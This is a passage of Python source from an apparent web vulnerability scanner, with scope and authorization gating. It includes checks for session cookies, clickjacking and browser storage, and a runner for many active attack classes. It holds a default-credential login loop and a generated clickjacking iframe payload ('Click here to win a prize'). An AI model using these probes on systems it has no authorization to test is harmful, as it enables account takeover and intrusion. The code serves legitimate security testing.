                form = {"username": username, "password": password}
                response = await tpost(
                    client,
                    url,
                    data=form,
                    follow_redirects=False,
                )
                request_evidence = "POST {} form username={} password=[REDACTED]".format(
                    url, username
                )
            if response is None:
                continue
            lowered = (response.text or "").lower()
            if (
                response.status_code in {423, 429}
                or any(term in lowered for term in LOCKOUT_TERMS)
            ):
                break
            succeeded, indicators = _login_success(response)
            if not succeeded:
                continue
            findings.append(normalize_finding({
                "source": "default-credentials-class-34",
                "title": "Default Credentials Accepted",
                "vuln_type": "Default Credentials",
                "severity": "CRITICAL",
                "confidence": 99,
                "url": url,
                "method": "POST",
                "parameter": "username,password",
                "description": (
                    "The login endpoint accepted a common default credential pair."
                ),
                "evidence": json.dumps({
                    "request": request_evidence,
                    "username": username,
                    "password": "[REDACTED]",
                    "attempt_number": attempt_number,
                    "status_code": response.status_code,
                    "location": response.headers.get("location", ""),
                    "success_indicators": indicators,
                    "response_excerpt": (response.text or "")[:800],
                }, ensure_ascii=False),
                "exploitability_status": "confirmed",
                "evidence_strength": "strong",
                "false_positive_risk": "low",
                "business_impact": (
                    "An attacker can authenticate using publicly known credentials "
                    "and may gain administrative or privileged access."
                ),
                "remediation": (
                    "Remove default accounts or force unique credentials during setup, "
                    "rotate the affected password, and enable MFA and lockout controls."
                ),
                "cwe": "CWE-798",
                "cvss": 9.8,
                "note": (
                    "Testing stopped immediately after the first successful credential."
                ),
                "reproduction_steps": [
                    "Send the recorded login request in the authorized environment.",
                    "Observe the session/token or authenticated redirect indicator.",
                    "Log out immediately and rotate the default credential.",
                ],
                "redaction_status": "redacted",
            }))
            return findings
    return findings


SESSION_COOKIE_RE = re.compile(
    r"(?i)(session|sessid|sid$|auth|token|jwt|connect\.sid|phpsessid|jsessionid)"
)
PREDICTABLE_COOKIE_RE = re.compile(r"^(?:\d{6,}|1[6-9]\d{8,12}|20\d{8,12})$")
SENSITIVE_HTML_RE = re.compile(
    r"(?is)(<input[^>]+type=[\"']?(?:password|email)|"
    r"<input[^>]+name=[\"'][^\"']*(?:card|payment|amount|transfer)|"
    r"<form\b[^>]*(?:payment|purchase|transfer|settings|profile|admin)|"
    r"\b(?:account settings|user profile|money transfer|checkout|admin panel)\b)"
)
STORAGE_KEY_RE = re.compile(
    r"(?i)(token|auth|jwt|session|password|secret|api[_-]?key|user[_-]?id)"
)


def _set_cookie_headers(response) -> list[str]:
    try:
        return list(response.headers.get_list("set-cookie"))
    except Exception:
        value = response.headers.get("set-cookie", "")
        return [value] if value else []


def _cookie_parts(header: str) -> tuple[str, str, list[str]]:
    parts = [part.strip() for part in str(header).split(";") if part.strip()]
    name, _, value = (parts[0] if parts else "").partition("=")
    return name.strip(), value.strip(), parts[1:]


def _redacted_cookie_header(header: str) -> str:
    name, _value, attributes = _cookie_parts(header)
    return "{}=[REDACTED]{}".format(
        name, "; " + "; ".join(attributes) if attributes else ""
    )


async def hunt_session_security(client, urls: list[str]) -> list[dict]:
    """Class 36: analyze session-cookie attributes and simple fixation signals."""
    results: list[dict] = []
    observed: list[tuple[str, str, str, str]] = []
    for url in list(dict.fromkeys(urls or []))[:80]:
        try:
            response = await tget(client, url)
        except Exception:
            continue
        for header in _set_cookie_headers(response):
            name, value, attributes = _cookie_parts(header)
            if not name or not SESSION_COOKIE_RE.search(name):
                continue
            lower_attributes = [attribute.lower() for attribute in attributes]
            evidence = _redacted_cookie_header(header)
            observed.append((url, name, value, evidence))
            issues: list[tuple[str, str, str, str, str]] = []
            if "httponly" not in lower_attributes:
                issues.append((
                    "session_cookie_no_httponly", "MEDIUM", "CWE-1004",
                    "JavaScript running in the page may read and exfiltrate the session cookie.",
                    "Add the HttpOnly attribute to every authentication cookie.",
                ))
            if urlparse(url).scheme == "https" and "secure" not in lower_attributes:
                issues.append((
                    "session_cookie_no_secure", "MEDIUM", "CWE-614",
                    "The browser may transmit the session cookie over an unencrypted channel.",
                    "Add the Secure attribute and serve the application exclusively over HTTPS.",
                ))
            same_site = next(
                (item for item in lower_attributes if item.startswith("samesite=")), ""
            )
            if same_site == "samesite=none" and "secure" not in lower_attributes:
                issues.append((
                    "session_cookie_samesite_none", "MEDIUM", "CWE-1275",
                    "A cross-site cookie without Secure can weaken session protections.",
                    "Pair SameSite=None with Secure or use Lax/Strict where possible.",
                ))
            elif not same_site:
                issues.append((
                    "session_cookie_no_samesite", "LOW", "CWE-1275",
                    "Cross-site requests may include the session cookie, increasing CSRF exposure.",
                    "Set SameSite=Lax or SameSite=Strict for authentication cookies.",
                ))
            if value and len(value) < 16:
                issues.append((
                    "session_cookie_weak_entropy", "HIGH", "CWE-330",
                    "A short session identifier may be guessable or brute-forced.",
                    "Generate at least 128 bits of cryptographically secure session entropy.",
                ))
            if value and PREDICTABLE_COOKIE_RE.fullmatch(value):
                issues.append((
                    "session_cookie_predictable", "HIGH", "CWE-330",
                    "A numeric or timestamp-like session identifier may be predictable.",
                    "Use a cryptographically secure random session identifier.",
                ))
            for vuln_type, severity, cwe, scenario, remediation in issues:
                results.append(finding(
                    vuln_type, severity, 85, url, "GET", scenario,
                    "Set-Cookie: {}".format(evidence), remediation, cwe=cwe,
                    extra={
                        "exploitability_status": "probable",
                        "evidence_strength": "moderate",
                        "false_positive_risk": "low",
                        "business_impact": scenario,
                        "reproduction_steps": [
                            "Request the affected page over an authorized session.",
                            "Inspect the Set-Cookie response header.",
                            "Confirm the reported attribute or entropy weakness.",
                        ],
                        "redaction_status": "redacted",
                    },
                ))

    logout_urls = [
        url for url in urls or []
        if re.search(r"(?i)/(?:logout|signout|logoff)(?:/|$|\?)", url)
    ]
    if logout_urls and observed:
        source_url, cookie_name, before_value, evidence = observed[0]
        try:
            await tget(client, logout_urls[0])
            after = await tget(client, source_url)
            after_values = {
                name: value
                for header in _set_cookie_headers(after)
                for name, value, _attributes in [_cookie_parts(header)]
            }
            if before_value and after_values.get(cookie_name) == before_value:
                results.append(finding(
                    "session_fixation_candidate", "HIGH", 75, source_url, "GET",
                    "The same session identifier was reissued after the discovered logout flow.",
                    "Before and after logout: {}".format(evidence),
                    "Invalidate the server-side session on logout and issue a new identifier after authentication.",
                    cwe="CWE-384",
                    extra={
                        "exploitability_status": "needs_manual_validation",
                        "evidence_strength": "moderate",
                        "false_positive_risk": "medium",
                        "business_impact": "A persistent identifier may allow session fixation or continued session use.",
                        "reproduction_steps": [
                            "Authenticate with a controlled test account.",
                            "Record the redacted session-cookie structure and log out.",
                            "Request the original page and compare whether the identifier rotates.",
                        ],
                        "redaction_status": "redacted",
                    },
                ))
        except Exception:
            pass
    return results


async def hunt_clickjacking(client, urls: list[str]) -> list[dict]:
    """Class 37: sensitive HTML pages lacking both frame defenses."""
    results: list[dict] = []
    for url in list(dict.fromkeys(urls or []))[:100]:
        try:
            response = await tget(client, url)
        except Exception:
            continue
        content_type = response.headers.get("content-type", "").lower()
        body = response.text[:300000]
        if "html" not in content_type and "<html" not in body.lower():
            continue
        xfo = response.headers.get("x-frame-options", "").upper()
        csp = response.headers.get("content-security-policy", "").lower()
        if xfo in {"DENY", "SAMEORIGIN"} or "frame-ancestors" in csp:
            continue
        if not SENSITIVE_HTML_RE.search(body):
            continue
        poc = (
            '<iframe src="{}" width="800" height="600" '
            'style="opacity:0.1;position:absolute;top:0;left:0;z-index:999">'
            "</iframe>\n<p>Click here to win a prize</p>"
        ).format(html.escape(url, quote=True))
        results.append(finding(
            "clickjacking_candidate", "MEDIUM", 80, url, "GET",
            "A sensitive page can be framed because neither X-Frame-Options nor CSP frame-ancestors is present.",
            "X-Frame-Options: missing\nCSP frame-ancestors: missing\nPoC:\n{}".format(poc),
            "Set Content-Security-Policy: frame-ancestors 'none' or a strict allowlist; retain X-Frame-Options for legacy clients.",
            cwe="CWE-1021",
            extra={
                "exploitability_status": "probable",
                "evidence_strength": "moderate",
                "false_positive_risk": "low",
                "business_impact": "An attacker may visually overlay a sensitive action and trick a user into clicking it.",
                "reproduction_steps": [
                    "Save the generated iframe PoC locally.",
                    "Open it while authenticated with a controlled test account.",
                    "Confirm whether the sensitive page renders inside the frame.",
                ],
                "poc": poc,
                "redaction_status": "redacted",
            },
        ))
    return results


async def hunt_browser_storage(client, js_urls: list[str]) -> list[dict]:
    """Class 38: static browser-storage and postMessage analysis."""
    results: list[dict] = []
    storage_re = re.compile(
        r"(?i)\b(localStorage|sessionStorage)\s*\.\s*setItem\s*\(\s*"
        r"[\"']([^\"']+)[\"']"
    )
    cookie_re = re.compile(
        r"(?i)document\.cookie\s*=\s*[^;\n]*(token|auth|jwt|session|secret)"
    )
    message_re = re.compile(
        r"(?i)(?:addEventListener\s*\(\s*[\"']message[\"']|onmessage\s*=)"
    )
    for js_url in list(dict.fromkeys(js_urls or []))[:40]:
        allowed, _ = scope_policy.record_request(js_url, action="active")
        if not allowed:
            continue
        try:
            response = await client.get(js_url)
        except Exception:
            continue
        if response.status_code != 200:
            continue
        lines = response.text.splitlines()
        for index, line in enumerate(lines):
            snippet = redact_secrets(line.strip()[:500])
            storage_match = storage_re.search(line)
            if storage_match and STORAGE_KEY_RE.search(storage_match.group(2)):
                vuln_type = (
                    "sensitive_data_in_localstorage"
                    if storage_match.group(1).lower() == "localstorage"
                    else "sensitive_data_in_sessionstorage"
                )
                results.append(finding(
                    vuln_type, "MEDIUM", 70, js_url, "GET",
                    "Client-side code stores a sensitive value in browser storage accessible to JavaScript.",
                    "{}:{} {}".format(js_url, index + 1, snippet),
                    "Keep authentication secrets in Secure, HttpOnly cookies and avoid persistent browser storage.",
                    cwe="CWE-312",
                    extra={
                        "exploitability_status": "needs_manual_validation",
                        "evidence_strength": "weak",
                        "false_positive_risk": "medium",
                        "business_impact": "A successful XSS or malicious extension could read the stored value.",
                        "js_file": js_url,
                        "line_number": index + 1,
                        "code_snippet": snippet,
                        "redaction_status": "redacted",
                    },
                ))
            if cookie_re.search(line):
                results.append(finding(
                    "token_in_cookie_via_js", "MEDIUM", 70, js_url, "GET",
                    "JavaScript appears to place an authentication value into document.cookie.",
                    "{}:{} {}".format(js_url, index + 1, snippet),
                    "Set authentication cookies server-side with Secure, HttpOnly, and SameSite attributes.",
                    cwe="CWE-1004",
                    extra={
                        "exploitability_status": "needs_manual_validation",
                        "evidence_strength": "weak",
                        "false_positive_risk": "medium",
                        "business_impact": "A script-readable authentication cookie is exposed to XSS-based theft.",
                        "js_file": js_url, "line_number": index + 1,
                        "code_snippet": snippet, "redaction_status": "redacted",
                    },
                ))
            if message_re.search(line):
                nearby = "\n".join(lines[index:index + 11])
                if not re.search(
                    r"(?i)(?:event|e)\.origin\s*(?:===|==|!==|!=)|allowedOrigins|trustedOrigins",
                    nearby,
                ):
                    redacted_nearby = redact_secrets(nearby[:900])
                    results.append(finding(
                        "postmessage_no_origin_check", "HIGH", 75, js_url, "GET",
                        "A message handler was found without a nearby sender-origin validation check.",
                        "{}:{} {}".format(js_url, index + 1, redacted_nearby),
                        "Validate event.origin against an exact allowlist before processing message data.",
                        cwe="CWE-345",
                        extra={
                            "exploitability_status": "needs_manual_validation",
                            "evidence_strength": "moderate",
                            "false_positive_risk": "medium",
                            "business_impact": "An untrusted origin may trigger privileged browser behavior.",
                            "js_file": js_url, "line_number": index + 1,
                            "code_snippet": redacted_nearby,
                            "redaction_status": "redacted",
                        },
                    ))
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  MASTER HUNT RUNNER
# ══════════════════════════════════════════════════════════════════════════════

PER_URL_CLASSES  = [
    ("Security Headers",   hunt_security_headers),
    ("CORS",               hunt_cors),
    ("Open Redirect",      hunt_open_redirect),
    ("SQL Injection",      hunt_sqli),
    ("XSS",                hunt_xss),
    ("IDOR",               hunt_idor),
    ("SSRF",               hunt_ssrf),
    ("Rate Limiting",      hunt_rate_limiting),
    ("JWT Analysis",       hunt_jwt),
    ("JWT Key Confusion",   hunt_jwt_key_confusion_candidates),
    ("Prototype Pollution", hunt_prototype_pollution),
    ("SSTI",               hunt_ssti),
    ("WebSocket Security", hunt_websocket_security_issues),
    ("HTTP Desync",        hunt_http_desync_candidates),
    ("Cache Poisoning",    hunt_cache_poisoning),
    ("XXE Candidates",     hunt_xxe_candidates),
    ("File Upload Abuse",  hunt_file_upload_abuse_candidates),
    ("Business Logic",     hunt_business_logic_candidates),
    ("Race Conditions",    hunt_race_condition_candidates),
    ("Subdomain Takeover", hunt_subdomain_takeover),
]

PER_BASE_CLASSES = [
    ("Sensitive Paths",    hunt_sensitive_paths),
    ("Auth Bypass",        hunt_auth_bypass),
    ("GraphQL",            hunt_graphql),
    ("GraphQL Authorization", hunt_graphql_authorization_candidates),
]


async def run_hunt(
    urls:           list,
    live_hosts:     list,
    log:            Callable,
    progress_cb:    Callable = None,
    waf_info:       dict     = None,
    schema_urls:    list     = None,
    graphql_schemas:list     = None,
    schema_endpoints:list    = None,
    websocket_urls:list      = None,
    js_urls:list             = None,
    enabled_modules:list     = None,
    enabled_classes:list     = None,
    max_urls:       int      = 200,
    concurrency_override:int = None,
    request_timeout:float    = None,
    batch_size:     int      = 0,
    resource_controller:ResourceController = None,
) -> list:
    """
    Run all hunt classes + dual-session auth matrix + OOB SQLi payloads.
    schema_urls: additional URLs injected from OpenAPI/GraphQL schema parsing.
    v3.4: Checks throttle.host_dead before each class — pivots to passive-only
    if HOST_DEAD_WAF is triggered mid-scan rather than continuing to hammer
    a target that is actively blocking all requests.
    """
    await log("[Hunt] ━━━ Phase 2: HUNT ━━━")
    activation_list = enabled_classes if enabled_classes is not None else enabled_modules
    enabled_set = set(activation_list or [])
    resources = resource_controller or ResourceController()

    def _activation_allowed(name: str):
        if activation_list is not None and name not in enabled_set:
            return False, "disabled by adaptive module plan"
        return scope_policy.vulnerability_allowed(name)

    timeout_token = REQUEST_TIMEOUT.set(
        httpx.Timeout(float(request_timeout))
        if request_timeout else TIMEOUT
    )

    # Merge schema-derived URLs into test set
    all_urls = list(urls)
    if schema_urls:
        all_urls.extend(schema_urls)
        await log("[Hunt] +{} schema-derived URLs injected from API schemas".format(len(schema_urls)))

    strategy    = scope_policy.normalize_mode((waf_info or {}).get("strategy", scope_policy.config.scan_mode))
    conc_map    = {"passive_only": 0, "conservative": 3, "normal": 8, "intensive_authorized": 12}
    concurrency = (
        max(1, int(concurrency_override))
        if concurrency_override is not None
        else conc_map.get(strategy, 8)
    )
    await log("[Hunt] Strategy: {} | Concurrency: {} | URLs: {}".format(
        strategy, concurrency, min(len(all_urls), 200)))

    all_findings = []
    tested_bases = set()
    urls_to_test = scope_policy.filter_urls(
        list(dict.fromkeys(all_urls))[:max(1, int(max_urls))],
        action="active",
    )

    base_urls = []
    for h in live_hosts:
        parsed = urlparse(h["url"])
        base   = "{}://{}".format(parsed.scheme, parsed.netloc)
        if base not in tested_bases:
            tested_bases.add(base)
            base_urls.append(h["url"])

    sem = asyncio.Semaphore(concurrency)

    if oob.available:
        await log("[Hunt] OOB engine active — injecting blind payloads into SQLi/SSRF/param mining")

    async def _check_host_dead(class_name: str) -> bool:
        """
        v3.4: Check HOST_DEAD_WAF flag before starting each hunt class.
        Returns True if scan should pivot to passive-only (skip active classes).
        """
        if throttle._host_dead:
            await log("[Hunt] HOST_DEAD_WAF — skipping active class '{}', pivoting to passive-only".format(
                class_name), )
            return True
        return False

    async with httpx.AsyncClient(
        headers=BASE_HEADERS, verify=False, follow_redirects=True,
        timeout=REQUEST_TIMEOUT.get(),
        limits=httpx.Limits(max_connections=concurrency + 5)
    ) as client:

        total_classes = len(PER_URL_CLASSES) + len(PER_BASE_CLASSES) + 25
        class_idx     = 0

        # ── Per-URL classes ───────────────────────────────────────────────────
        for name, fn in PER_URL_CLASSES:
            await resources.gate()
            class_idx += 1
            allowed_class, class_reason = _activation_allowed(name)
            if not allowed_class:
                await log("[Hunt] Skipping '{}' — {}".format(name, class_reason))
                continue
            # v3.4: skip active classes if HOST_DEAD_WAF triggered
            if await _check_host_dead(name):
                break
            await log("[Hunt] {}/{} {}".format(class_idx, total_classes, name))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, name)

            async def run_one(url, _fn=fn):
                async with sem:
                    try:
                        if _fn is hunt_sqli:
                            return await _fn(client, url, waf_info=waf_info)
                        return await _fn(client, url)
                    except Exception:
                        return []

            effective_batch = max(1, int(batch_size or len(urls_to_test) or 1))
            for offset in range(0, len(urls_to_test), effective_batch):
                await resources.gate()
                batch = await asyncio.gather(*[
                    run_one(u)
                    for u in urls_to_test[offset:offset + effective_batch]
                ])
                for r in batch:
                    all_findings.extend(r)
                await asyncio.sleep(0)

        # ── Per-base classes ──────────────────────────────────────────────────
        for name, fn in PER_BASE_CLASSES:
            await resources.gate()
            class_idx += 1
            allowed_class, class_reason = _activation_allowed(name)
            if not allowed_class:
                await log("[Hunt] Skipping '{}' — {}".format(name, class_reason))
                continue
            if await _check_host_dead(name):
                break
            await log("[Hunt] {}/{} {}".format(class_idx, total_classes, name))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, name)

            async def run_base(url, _fn=fn):
                async with sem:
                    try:
                        return await _fn(client, url)
                    except Exception:
                        return []

            batch = await asyncio.gather(*[run_base(u) for u in base_urls])
            for r in batch:
                all_findings.extend(r)

        # ── Parameter Mining (with OOB RCE injection) ─────────────────────────
        class_idx += 1
        if not throttle._host_dead:
            allowed_class, class_reason = _activation_allowed("Parameter Mining")
            if not allowed_class:
                await log("[Hunt] Skipping Parameter Mining — {}".format(class_reason))
            else:
                await log("[Hunt] {}/{} Parameter Mining".format(class_idx, total_classes))
                if progress_cb:
                    await progress_cb("hunt", class_idx, total_classes, "Parameter Mining")
                param_findings = await hunt_parameter_mining(client, all_urls, live_hosts)
                all_findings.extend(param_findings)

        # ── Web Cache Deception ───────────────────────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed("Web Cache Deception")
        if allowed_class:
            await log("[Hunt] {}/{} Web Cache Deception".format(class_idx, total_classes))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "Web Cache Deception")
            cache_findings = await hunt_cache_deception(client, all_urls, live_hosts)
            all_findings.extend(cache_findings)
        else:
            await log("[Hunt] Skipping Web Cache Deception — {}".format(class_reason))

        # ── Dual-Session Authorization Matrix (Class 16) ─────────────────────
        class_idx += 1
        await log("[Hunt] {}/{} Dual-Session Auth Matrix".format(class_idx, total_classes))
        if progress_cb:
            await progress_cb("hunt", class_idx, total_classes, "Auth Matrix")
        auth_matrix_enabled = any(
            name in enabled_set
            for name in ("IDOR", "Auth Bypass", "Business Logic")
        ) or activation_list is None
        if not auth_matrix_enabled:
            await log("[Hunt] Auth matrix skipped by adaptive module plan")
        elif not scope_policy.config.authenticated_testing_enabled:
            await log("[Hunt] Auth matrix skipped by ScopePolicy")
        elif auth_matrix.configured:
            matrix_findings = await auth_matrix.run_matrix(urls_to_test, log)
            all_findings.extend(matrix_findings)
            await log("[Hunt] Auth matrix: {} violation(s)".format(len(matrix_findings)))
        else:
            await log("[Hunt] Auth matrix: not configured (set sessions in dashboard → Config)")

        # ── OOB Blind SQLi injection pass ─────────────────────────────────────
        class_idx += 1
        await log("[Hunt] {}/{} OOB Blind SQLi Injection".format(class_idx, total_classes))
        if progress_cb:
            await progress_cb("hunt", class_idx, total_classes, "OOB Blind SQLi")
        oob_sqli_enabled = (
            activation_list is None or "SQL Injection" in enabled_set
        )
        if (
            oob_sqli_enabled
            and scope_policy.config.oob_testing_enabled
            and oob.available
        ):
            oob_findings = await _hunt_oob_sqli(client, urls_to_test, waf_info, log)
            all_findings.extend(oob_findings)
        else:
            await log("[Hunt] OOB engine unavailable or disabled by ScopePolicy — skipping blind SQLi injection")

        # ── Class 18: GraphQL Authorization Tester ───────────────────────────
        class_idx += 1
        await log("[Hunt] {}/{} GraphQL Authorization Tester".format(class_idx, total_classes))
        if progress_cb:
            await progress_cb("hunt", class_idx, total_classes, "GraphQL Authorization Tester")
        graphql_auth_enabled = (
            activation_list is None
            or "GraphQL Authorization" in enabled_set
        )
        if not graphql_auth_enabled:
            await log("[Hunt] GraphQL authorization tester skipped by adaptive module plan")
        elif not scope_policy.config.authenticated_testing_enabled:
            await log("[Hunt] GraphQL authorization tester skipped by ScopePolicy")
        elif not auth_matrix.configured:
            await log("[Hunt] GraphQL authorization tester skipped: dual sessions not configured")
        elif not graphql_schemas:
            await log("[Hunt] GraphQL authorization tester skipped: no discovered schema")
        elif throttle.host_dead:
            await log("[Hunt] GraphQL authorization tester skipped: target is blocking requests")
        else:
            session_a_headers, session_b_headers = auth_matrix.session_headers()
            for schema_entry in graphql_schemas[:5]:
                graphql_url = schema_entry.get("url", "")
                schema = schema_entry.get("schema", {})
                allowed, reason = scope_policy.validate_target(
                    graphql_url,
                    action="authenticated",
                )
                if not allowed:
                    await log("[Hunt] GraphQL auth skipped for {}: {}".format(graphql_url, reason))
                    continue
                graphql_findings = await test_graphql_auth(
                    graphql_url,
                    schema,
                    session_a_headers,
                    session_b_headers,
                    client,
                )
                all_findings.extend(graphql_findings)
                await log("[Hunt] GraphQL auth: {} finding(s) from {}".format(
                    len(graphql_findings),
                    graphql_url,
                ))

        # ── Class 19: OAuth Flow Tester ──────────────────────────────────────
        class_idx += 1
        oauth_urls = [
            url for url in all_urls
            if any(hint in url.lower() for hint in OAUTH_HINTS)
        ]
        if not oauth_urls:
            await log("[Hunt] Class 19 OAuth Flow Tester skipped: no OAuth endpoints discovered")
        else:
            allowed_class, class_reason = _activation_allowed("OAuth Flow")
            if not allowed_class:
                await log("[Hunt] Class 19 OAuth Flow Tester skipped — {}".format(class_reason))
            elif throttle.host_dead:
                await log("[Hunt] Class 19 OAuth Flow Tester skipped: target is blocking requests")
            else:
                await log("[Hunt] {}/{} Class 19: OAuth Flow Tester".format(
                    class_idx, total_classes
                ))
                if progress_cb:
                    await progress_cb("hunt", class_idx, total_classes, "OAuth Flow Tester")
                for base_url in base_urls:
                    base_host = urlparse(base_url).netloc
                    host_oauth_urls = [
                        url for url in oauth_urls
                        if urlparse(url).netloc == base_host
                    ]
                    if not host_oauth_urls:
                        continue
                    oauth_findings = await test_oauth_flow(
                        base_url,
                        host_oauth_urls,
                        client,
                    )
                    all_findings.extend(
                        normalize_finding(item) for item in oauth_findings
                    )
                    await log("[Hunt] OAuth flow: {} finding(s) from {}".format(
                        len(oauth_findings),
                        base_host,
                    ))

        # ── Class 20: Confirmed Mass Assignment Testing ─────────────────────
        class_idx += 1
        mutation_endpoints = [
            endpoint for endpoint in (schema_endpoints or [])
            if isinstance(endpoint, dict)
            and str(endpoint.get("method", "")).upper() in {"POST", "PUT", "PATCH"}
            and isinstance(endpoint.get("body"), dict)
            and endpoint.get("body")
        ]
        if not mutation_endpoints:
            await log("[Hunt] Class 20 Mass Assignment skipped: no JSON mutation endpoints discovered")
        else:
            allowed_class, class_reason = _activation_allowed(
                "Mass Assignment"
            )
            if not allowed_class:
                await log("[Hunt] Class 20 Mass Assignment skipped — {}".format(class_reason))
            elif not scope_policy.config.authenticated_testing_enabled:
                await log("[Hunt] Class 20 Mass Assignment skipped: authenticated testing disabled")
            elif not auth_matrix.configured:
                await log("[Hunt] Class 20 Mass Assignment skipped: dual sessions not configured")
            elif not auth_matrix.mutations_allowed:
                await log("[Hunt] Class 20 Mass Assignment skipped: allow_mutations is disabled")
            elif throttle.host_dead:
                await log("[Hunt] Class 20 Mass Assignment skipped: target is blocking requests")
            else:
                await log("[Hunt] {}/{} Class 20: Mass Assignment Testing".format(
                    class_idx, total_classes
                ))
                if progress_cb:
                    await progress_cb(
                        "hunt", class_idx, total_classes, "Mass Assignment Testing"
                    )
                session_a_headers, _session_b_headers = auth_matrix.session_headers()
                mass_findings = await hunt_mass_assignment_confirmed(
                    client, mutation_endpoints, session_a_headers
                )
                all_findings.extend(mass_findings)
                await log("[Hunt] Mass assignment: {} confirmed finding(s)".format(
                    len(mass_findings)
                ))

        # ── Class 21: Behavioral Anomaly Detector ────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed(
            "Behavioral Anomaly"
        )
        if not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 21 Behavioral Anomalies skipped: active testing disabled")
        elif not allowed_class:
            await log("[Hunt] Class 21 Behavioral Anomalies skipped — {}".format(
                class_reason
            ))
        elif throttle.host_dead:
            await log("[Hunt] Class 21 Behavioral Anomalies skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 21: Behavioral Anomaly Detector".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "Behavioral Anomaly Detector"
                )

            anomaly_sem = asyncio.Semaphore(min(concurrency, 3))

            async def run_anomaly(url):
                async with anomaly_sem:
                    try:
                        return await detect_anomalies(url, client, scope_policy)
                    except Exception:
                        return []

            anomaly_batches = await asyncio.gather(*[
                run_anomaly(url) for url in urls_to_test
            ])
            anomaly_count = 0
            for anomaly_findings in anomaly_batches:
                anomaly_count += len(anomaly_findings)
                all_findings.extend(
                    normalize_finding(item) for item in anomaly_findings
                )
            await log("[Hunt] Behavioral anomalies: {} candidate(s)".format(
                anomaly_count
            ))

        # ── Class 22: Prototype Pollution Persistence Testing ────────────────
        class_idx += 1
        prototype_endpoints = list(dict.fromkeys(
            str(endpoint.get("url", ""))
            for endpoint in (schema_endpoints or [])
            if isinstance(endpoint, dict)
            and str(endpoint.get("method", "")).upper() in {"POST", "PUT"}
            and str(endpoint.get("content_type", "")).lower() == "application/json"
            and isinstance(endpoint.get("body"), dict)
            and endpoint.get("url")
        ))
        allowed_class, class_reason = _activation_allowed(
            "Prototype Pollution"
        )
        if not prototype_endpoints:
            await log("[Hunt] Class 22 Prototype Pollution skipped: no POST/PUT JSON endpoints discovered")
        elif not allowed_class:
            await log("[Hunt] Class 22 Prototype Pollution skipped — {}".format(
                class_reason
            ))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 22 Prototype Pollution skipped: active testing disabled")
        elif not scope_policy.config.authenticated_testing_enabled:
            await log("[Hunt] Class 22 Prototype Pollution skipped: authenticated testing disabled")
        elif not auth_matrix.configured:
            await log("[Hunt] Class 22 Prototype Pollution skipped: dual sessions not configured")
        elif not auth_matrix.mutations_allowed:
            await log("[Hunt] Class 22 Prototype Pollution skipped: allow_mutations is disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 22 Prototype Pollution skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 22: Prototype Pollution Testing".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "Prototype Pollution Testing"
                )

            session_a_headers, _session_b_headers = auth_matrix.session_headers()
            prototype_client = httpx.AsyncClient(
                headers={**BASE_HEADERS, **session_a_headers},
                verify=False,
                follow_redirects=False,
                timeout=REQUEST_TIMEOUT.get(),
                limits=httpx.Limits(max_connections=3),
            )
            try:
                prototype_findings = []
                for endpoint_url in prototype_endpoints[:20]:
                    prototype_findings.extend(
                        await test_prototype_pollution(
                            endpoint_url,
                            prototype_client,
                            scope_policy,
                        )
                    )
                all_findings.extend(
                    normalize_finding(item) for item in prototype_findings
                )
                await log("[Hunt] Prototype pollution: {} finding(s)".format(
                    len(prototype_findings)
                ))
            finally:
                await prototype_client.aclose()

        # ── Class 23: Safe Request Smuggling Timing Detector ────────────────
        class_idx += 1
        smuggling_bases = list(dict.fromkeys(
            "{}://{}".format(urlparse(url).scheme, urlparse(url).netloc)
            for url in urls_to_test
            if urlparse(url).scheme.lower() == "https"
        ))
        allowed_class, class_reason = _activation_allowed(
            "Request Smuggling"
        )
        deep_authorized = scope_policy.normalize_mode(
            scope_policy.config.scan_mode
        ) in {"normal", "intensive_authorized"}
        if not deep_authorized:
            await log("[Hunt] Class 23 Request Smuggling skipped: Deep Authorized Scan required")
        elif not allowed_class:
            await log("[Hunt] Class 23 Request Smuggling skipped — {}".format(
                class_reason
            ))
        elif not smuggling_bases:
            await log("[Hunt] Class 23 Request Smuggling skipped: no HTTPS endpoints discovered")
        elif throttle.host_dead:
            await log("[Hunt] Class 23 Request Smuggling skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 23: Request Smuggling Timing Detector".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes,
                    "Request Smuggling Timing Detector",
                )
            smuggling_findings = []
            for base_url in smuggling_bases[:10]:
                smuggling_findings.extend(
                    await detect_smuggling(base_url, client, scope_policy)
                )
            all_findings.extend(
                normalize_finding(item) for item in smuggling_findings
            )
            await log("[Hunt] Request smuggling: {} candidate(s)".format(
                len(smuggling_findings)
            ))

        # ── Class 24: API Version Differential Testing ──────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed(
            "API Version"
        )
        versioned_urls = [
            url for url in all_urls
            if re.search(r"(?i)(/v\d+/|/api/\d+/)", urlparse(url).path)
        ]
        if not allowed_class:
            await log("[Hunt] Class 24 API Versions skipped — {}".format(class_reason))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 24 API Versions skipped: active testing disabled")
        elif not base_urls:
            await log("[Hunt] Class 24 API Versions skipped: no live API origins discovered")
        elif throttle.host_dead:
            await log("[Hunt] Class 24 API Versions skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 24: API Version Testing".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "API Version Testing"
                )
            version_findings = []
            for base_url in base_urls:
                version_findings.extend(await test_api_versions(
                    base_url,
                    versioned_urls,
                    client,
                    scope_policy,
                ))
            all_findings.extend(
                normalize_finding(item) for item in version_findings
            )
            await log("[Hunt] API versions: {} finding(s)".format(
                len(version_findings)
            ))

        # ── Class 25: Stored XSS ─────────────────────────────────────────────
        class_idx += 1
